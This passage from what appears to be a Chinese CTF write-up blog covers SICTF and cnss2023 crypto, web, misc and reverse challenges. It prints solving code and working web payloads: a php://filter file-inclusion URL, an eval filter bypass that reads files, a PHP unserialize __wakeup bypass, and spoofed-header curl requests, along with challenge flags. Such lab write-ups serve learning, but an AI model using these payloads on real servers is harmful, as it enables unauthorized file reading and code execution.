class="string">&#x27;08b&#x27;</span>))(data))</span><br><span class="line">    padding = <span class="built_in">len</span>(binary_str) % <span class="number">24</span></span><br><span class="line">    <span class="keyword">if</span> padding != <span class="number">0</span>:</span><br><span class="line">        binary_str += <span class="string">&#x27;0&#x27;</span> * (<span class="number">24</span> - padding)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">6</span>):</span><br><span class="line">        group = binary_str[i:i + <span class="number">6</span>]</span><br><span class="line">        decimal_val = <span class="built_in">int</span>(group, <span class="number">2</span>)</span><br><span class="line">        result += BASE64_CHARS[decimal_val]</span><br><span class="line">    padding_count = (<span class="number">4</span> - <span class="built_in">len</span>(result) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">    result += <span class="string">&#x27;=&#x27;</span> * padding_count</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>).encode()</span><br><span class="line">encoded_data = base64_encode(data)</span><br><span class="line"><span class="built_in">print</span>(encoded_data)</span><br><span class="line"><span class="keyword">if</span> encoded_data == <span class="string">&#x27;U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;True!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯base64æ¢è¡¨ï¼Œç”¨è¿™ä¸ªè§£å¯†</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>SICTF{8e0d358d-8b9d-4866-9b02-6749b07ad09a}æ‹¿åˆ°flag</p>
<h2 id="javacode"><a href="#javacode" class="headerlink" title="javacode"></a>javacode</h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ç­¾åˆ°-å¤å…¸å¤§æ‚çƒ©"><a href="#ç­¾åˆ°-å¤å…¸å¤§æ‚çƒ©" class="headerlink" title="[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©"></a>[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©</h2><p>emjoyç¼–ç ï¼Œç”¨è¿™ä¸ªè§£ç <a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p>ç„¶åå°±ä¸çŸ¥é“ä»€ä¹ˆç¼–ç äº†ï¼Œåœ¨æœç´¢ctfç¼–ç è¯†åˆ«çš„æ—¶å€™æ‰¾åˆ°äº†è¿™ä¸ªé¡¹ç›®</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Ciphey/Ciphey">https://github.com/Ciphey/Ciphey</a> ç”¨è¿™ä¸ªé¡¹ç›®è§£å‡ºäº†flagï¼Œè¿™æ˜¯dockerç‰ˆæœ¬çš„ä½¿ç”¨<a target="_blank" rel="noopener" href="https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey">https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey</a></p>
<p>SICTF{fe853b49-8730-462e-86f5-fc8e9789f077}</p>
<h2 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h2><p>æœ‰ä¸‰ç»„n cï¼Œç„¶åeæ¯”è¾ƒå°ï¼Œç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚è§£åŒä½™æ–¹ç¨‹ï¼ŒaListï¼šä½™æ•°ï¼ŒmListï¼šæ¨¡æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">aList, mList</span>):</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mList:</span><br><span class="line">        M = M * i  <span class="comment"># è®¡ç®—M = âˆ mi</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mList)):</span><br><span class="line">        Mi = M // mList[i]  <span class="comment"># è®¡ç®—Mi</span></span><br><span class="line">        Mi_inverse = gmpy2.invert(Mi, mList[i])  <span class="comment"># è®¡ç®—Miçš„é€†å…ƒ</span></span><br><span class="line">        x += aList[i] * Mi * Mi_inverse  <span class="comment"># æ„é€ xå„é¡¹</span></span><br><span class="line">    x = x % M</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n1 = <span class="string">&quot;14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923&quot;</span></span><br><span class="line">    n2 = <span class="string">&quot;16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499&quot;</span></span><br><span class="line">    n3 = <span class="string">&quot;12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681&quot;</span></span><br><span class="line">    c1 = <span class="string">&quot;786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602&quot;</span></span><br><span class="line">    c2 = <span class="string">&quot;14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350&quot;</span></span><br><span class="line">    c3 = <span class="string">&quot;3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855&quot;</span></span><br><span class="line"></span><br><span class="line">    cList = [<span class="built_in">int</span>(c1), <span class="built_in">int</span>(c2), <span class="built_in">int</span>(c3)]</span><br><span class="line">    nList = [<span class="built_in">int</span>(n1), <span class="built_in">int</span>(n2), <span class="built_in">int</span>(n3)]</span><br><span class="line">    m_e = CRT(cList, nList)</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>,<span class="number">18</span>):</span><br><span class="line">        m, f = gmpy2.iroot(m_e, e)</span><br><span class="line">        m = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            m = m + <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        flag = binascii.unhexlify(m)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>SICTF{fdc0afb5-1c81-46b9-a28a-241f5f64419d}</p>
<h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, Eq, solve</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181</span></span><br><span class="line">m1 = <span class="number">11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line"></span><br><span class="line">delta_m_symbol = symbols(<span class="string">&#x27;delta_m&#x27;</span>)</span><br><span class="line">polynomial_equation = Eq(c, (m1 + delta_m_symbol)**<span class="number">3</span>)</span><br><span class="line">solutions = solve(polynomial_equation, delta_m_symbol)</span><br><span class="line">m_recovered = m1 + solutions[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m_recovered)[<span class="number">2</span>:]).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>SICTF{2ca8e589-4a31-4909-80f0-9ecfc8f8cb37}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç­¾åˆ°-Include"><a href="#ç­¾åˆ°-Include" class="headerlink" title="[ç­¾åˆ°]Include"></a>[ç­¾åˆ°]Include</h2><p><a target="_blank" rel="noopener" href="http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=flag.php">http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=flag.php</a> è¯»åˆ°ä¸‹é¢å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file_path = &quot;/flag&quot;;</span><br><span class="line">if (file_exists($file_path)) &#123;</span><br><span class="line">    $flag = file_get_contents($file_path);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;error&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®¿é—®flag.phpæ²¡æœ‰errorï¼Œæ‰€ä»¥ç”¨ä¼ªåè®®è¯»&#x2F;flag æ‹¿åˆ°flag</p>
<p><a target="_blank" rel="noopener" href="http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=/flag">http://210.44.151.51:10120/?SICTF=php://filter/read=convert.base64-encode/resource=/flag</a></p>
<p>base64è§£ç SICTF{f9bcd5bf-2e28-404c-936c-92d7f0ba2158}</p>
<h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/_|%5f|\.|%2E/i&#x27;</span>, <span class="variable">$query</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;You are Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k_e_y&#x27;</span>] !==<span class="string">&#x27;123&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^123$/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;k_e_y&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;You are will Win!&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\`|\@|\#|\\$|\%|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\+|\=|\&#123;|\&#125;|\[|\]|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>,<span class="variable">$command</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;You are Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;K_e_y is Errors!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç¬¬ä¸€ä¸ªpregæ˜¯å¯ä»¥ç”¨urlç¼–ç ä»£æ›¿ä¸‹åˆ’çº¿ï¼Œç„¶åç¬¬äºŒä¸ªpreg</p>
<p>$_GET[key]æ˜¯å¼ºæ¯”è¾ƒåŠ åé¢çš„preg_matchï¼Œæœäº†å¥½ä¹…å‘ç°å¯ä»¥ç”¨æ¢è¡Œç¬¦%0Aç»•è¿‡è¿™ä¸ªk%20e%20y&#x3D;123%0A</p>
<p>commandä¸­pregé‚£ä¸ªè¿™ä¸ªåœ†æ‹¬å·æ˜¯ä¸­æ–‡çš„åœ†æ‹¬å·ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ç”¨å‡½æ•°ï¼Œæˆ‘ä¸€å¼€å§‹æƒ³ç€æ˜¯system()ç„¶åå»ç½‘ä¸Šæ‰¾äº›shellä¸­çš„ä¸€äº›å¥‡æ€ªçš„æŠ€å·§å»ç»•è¿‡ï¼Œç„¶åå‘ç°å…³é”®çš„å­—ç¬¦åŸºæœ¬ä¸Šéƒ½ç»™è¿‡æ»¤äº†ï¼Œåé¢æƒ³äº†ä¸€ä¸‹èƒ½ç”¨å‡½æ•°ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥ç”¨å‡½æ•°æ¥æ›¿ä»£åŸæœ¬è¯¥ç”¨shellæ“ä½œçš„åŠ¨ä½œ</p>
<p>åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æ‰¾åˆ°äº†ç»“æœ<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/107171940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161461040516780255236081%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161461040516780255236081&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107171940.pc_search_result_no_baidu_js&utm_term=%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">https://blog.csdn.net/qq_38154820/article/details/107171940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161461040516780255236081%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161461040516780255236081&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107171940.pc_search_result_no_baidu_js&amp;utm_term=%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96</a></p>
<p>æœ€åçš„payloadæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?k%20e%20y=123%0A</span><br><span class="line">command=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h2><p>æ‘©æ–¯å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SICTF&#123;f2a09bf-7f4a-4269-93a5-c8a48360b03c&#125;</span><br></pre></td></tr></table></figure>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf-writeup/" title="ctf writeup">ctf writeup </a><span class="leancloud_visitors"></span><span>About 1287 words, 4 min 17 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/cnss2023/">cnss2023</a></h3></div><div class="post-content"><div class="card"><p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-SignIn"><a href="#Baby-SignIn" class="headerlink" title="[Baby] SignIn"></a>[Baby] SignIn</h2><p>æŸ¥çœ‹æºä»£ç ï¼Œscript.jsæ–‡ä»¶ä¸­æœ‰ä¸€æ®µdocument.getElementById(â€˜flagâ€™).addEventListener(â€˜clickâ€™, function()ä¸‹é¢æ˜¯ä¸€æ®µjsfuckæ··æ·†</p>
<p><a target="_blank" rel="noopener" href="https://enkhee-osiris.github.io/Decoder-JSFuck/">https://enkhee-osiris.github.io/Decoder-JSFuck/</a>  å¾—åˆ°flag</p>
<h2 id="Baby-Backdoor"><a href="#Baby-Backdoor" class="headerlink" title="[Baby] Backdoor"></a>[Baby] Backdoor</h2><p>postä¼ system()æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ‰¾åˆ°flag</p>
<h2 id="Baby-Webpack"><a href="#Baby-Webpack" class="headerlink" title="[Baby] Webpack"></a>[Baby] Webpack</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guowenrui/p/17023732.html">https://www.cnblogs.com/guowenrui/p/17023732.html</a> å‚è€ƒçš„è¿™ä¸ªæ–‡ç« </p>
<p>å®‰è£…nodejs ç”¨reverse-sourcemap .mapæ–‡ä»¶è¿˜åŸæ‰¾åˆ°flag</p>
<h2 id="Easy-Leak"><a href="#Easy-Leak" class="headerlink" title="[Easy] Leak"></a>[Easy] Leak</h2><p>.swpå¤‡ä»½æ–‡ä»¶ vim -rè¿˜åŸå¾—åˆ°flag</p>
<h2 id="Easy-ezhttp"><a href="#Easy-ezhttp" class="headerlink" title="[Easy] ezhttp"></a>[Easy] ezhttp</h2><p>ä¼ å‚çš„æ—¶å€™æœ‰äº›é—®é¢˜ï¼Œåƒä¼ hostè¿˜æœ‰refererï¼Œå¯èƒ½æ˜¯æˆ‘è¿™è¾¹å®‰è£…çš„burpæœ‰é—®é¢˜ï¼Œä¸Šç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹å‘ç°curlä¹Ÿèƒ½ä¼ å¾ˆå¤šå‚æ•°</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X CNSS -A &quot;Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4313 MMWEBSDK/20220604 Mobile Safari/537.36 MMWEBID/8603 MicroMessenger/8.0.24.2180(0x28001851) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64&quot; -H &quot;Referer: cnss.io&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;Host: uestc.edu.cn&quot; -H &quot;Content-Type: application/json&quot; -d &quot;&#123;\&quot;name\&quot;: \&quot;nyyyddddn\&quot;,\&quot;password\&quot; : \&quot;123456\&quot;&#125;&quot; -b &quot;name=nyyyddddn;password=123456&quot; -u nyyyddddn:123456 http://124.221.34.13:50005/Index</span><br></pre></td></tr></table></figure>



<h2 id="Easy-ezunserialize"><a href="#Easy-ezunserialize" class="headerlink" title="[Easy] ezunserialize"></a>[Easy] ezunserialize</h2><p>fssmslç½‘é¡µé‚£æ˜¾ç¤ºé”™è¯¯æ˜¯unicodeé‡Œé¢çš„LRI PDI RLOçš„åŸå› ï¼Œåœ¨ideé‡Œé¢æ²¡æœ‰è¿™ç§é—®é¢˜ï¼Œä¼ å‚çš„æ—¶å€™è½¬urlç¼–ç ä¼ å°±è¡Œäº†ï¼Œåªéœ€è¦æ”¹å¯¹è±¡æ•°é‡ç»•è¿‡__wakeupå°±æ‹¿åˆ°flagäº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$i_want2_say</span> = <span class="string">&#x27;â€®â¦fssmslâ©â¦i_like_web&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span> = <span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;i_want2_say = <span class="string">&#x27;i_like_web&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; wake up! &lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;ctf&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;i_want2_say === <span class="string">&#x27;â€®â¦fssmslâ©â¦i_like_web&#x27;</span>) &#123; <span class="comment">//wtf</span></span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you are 2 baby la&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>();</span><br><span class="line"><span class="variable">$ss</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="variable">$ss</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;CNSS&quot;:3&#x27;</span>,<span class="string">&#x27;&quot;CNSS&quot;:4&#x27;</span>,<span class="variable">$ss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ss</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Baby-Welcome-to-Reverse-World"><a href="#Baby-Welcome-to-Reverse-World" class="headerlink" title="[Baby] Welcome to Reverse World!"></a>[Baby] Welcome to Reverse World!</h2><p>mainå‡½æ•°é‚£ï¼Œä¸€æ‰“å¼€å°±æœ‰flagäº†</p>
